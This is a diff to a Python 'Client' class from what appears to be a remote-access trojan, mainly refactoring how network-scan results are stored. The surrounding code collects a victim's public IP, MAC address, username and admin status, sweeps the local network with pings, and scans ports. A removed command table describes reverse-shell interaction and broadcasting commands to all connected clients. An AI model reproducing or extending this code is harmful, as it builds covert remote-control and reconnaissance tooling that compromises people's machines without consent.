@@ -165,16 +165,16 @@ class Client():
     _lock       = threading.Lock()
     _abort      = False
     _debug      = False
-    _commands   = {'back': {'usage': 'back', 'description': 'background the current client'}, 'clients': {'usage': 'clients', 'description': 'list current clients'}, 'client': {'usage': 'client <id>', 'description': 'interact with client via reverse shell'}, 'exit': {'usage': 'exit', 'description': 'exit the program but keep clients alive'}, 'sendall': {'usage': 'sendall <command>', 'description': 'send a command to all currently connected clients'}, 'settings': {'usage': 'settings <value> [options]', 'description': 'list/change current display settings'}}
 
 
     def __init__(self, **kwargs):
-        self._jobs      = {}
-        self._results   = {}
-        self._services  = {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
-        self._info      = {k:v for k,v in zip(['id', 'ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'device', 'encryption'], [Client._get_client_id(), Client._get_public_ip(), Client._get_local_ip(), sys.platform, Client._get_mac_address(), Client._is_32_or_64_bit(), Client._get_username(), Client._is_user_admin(), Client._get_device_name(), Client._get_cipher()])}
-        self._commands  = {cmd: {'method': getattr(self, cmd), 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip(), 'platforms': getattr(Client, cmd).platforms} for cmd in vars(Client) if hasattr(vars(Client)[cmd], 'command')}
-        self._session   = {'connection': threading.Event()}
+        self._jobs          = {}
+        self._results       = {}
+        self._local_network = {}
+        self._session       = {'connection': threading.Event()}
+        self._services      = {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
+        self._info          = {k:v for k,v in zip(['id', 'ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'device', 'encryption'], [Client._get_client_id(), Client._get_public_ip(), Client._get_local_ip(), sys.platform, Client._get_mac_address(), Client._is_32_or_64_bit(), Client._get_username(), Client._is_user_admin(), Client._get_device_name(), Client._get_cipher()])}
+        self._commands      = {cmd: {'method': getattr(self, cmd), 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip(), 'platforms': getattr(Client, cmd).platforms} for cmd in vars(Client) if hasattr(vars(Client)[cmd], 'command')}
         self._setup(**kwargs)
 
 
@@ -694,7 +694,7 @@ class Client():
                 for x in xrange(10):
                     if self._jobs['scanner-%d' % x].is_alive():
                         self._jobs['scanner-%d' % x].join()
-            return json.dumps(self.scan.network)
+            return json.dumps(self._local_network)
         except Exception as e:
             self.debug('{} error: {}'.format(self._scan_host.func_name, str(e)))
             return '{} error: {}'.format(self._scan_host.func_name, str(e))
@@ -720,7 +720,7 @@ class Client():
                 self._jobs['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
                 self._jobs['scanner-%d' % x].start()
             self._jobs['scanner-%d' % x].join()
-            return json.dumps(self.scan.network)
+            return json.dumps(self._local_network)
         except Exception as e:
             self.debug('{} error: {}'.format(self._scan_network.func_name, str(e)))
             return '{} error: {}'.format(self._scan_network.func_name, str(e))
@@ -1213,7 +1213,7 @@ class Client():
     def _ping(self, host):
         try:
             if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
-                self.scan.network[host] = {}
+                self._local_network[host] = {}
                 return True
             else:
                 return False
@@ -1235,7 +1235,7 @@ class Client():
                 info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 50 else data[:46] + ' ...'), 'state': 'open'}}
             else:
                 info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': self._services.get(str(port))[1] if str(port) in self._services else 'n/a', 'state': 'open'}}
-            self.scan.network.get(host).update(info)
+            self._local_network.get(host).update(info)
         except (socket.error, socket.timeout):
             pass
         except Exception as e:
